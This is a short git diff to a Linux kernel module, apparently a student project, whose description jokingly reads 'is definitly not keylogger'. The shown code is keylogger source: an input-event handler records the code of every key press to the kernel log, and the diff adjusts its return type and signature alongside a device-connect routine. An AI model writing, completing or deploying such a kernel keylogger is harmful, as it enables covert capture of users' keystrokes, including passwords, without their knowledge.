@@ -10,12 +10,13 @@ MODULE_AUTHOR("281443-279460");
 MODULE_DESCRIPTION("is definitly not keylogger");
 MODULE_VERSION("1.0");
 
-static bool keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
-    if (type == EV_KEY && value == 1) { // Zdarzenie klawisza (naciśnięcie)
+static int keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
+    if (type == EV_KEY && value == 1) {
         printk(KERN_INFO "Key pressed: %u\n", code);
     }
-    return true;
+    return 0;  
 }
+
 
 static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
     struct input_handle *handle;
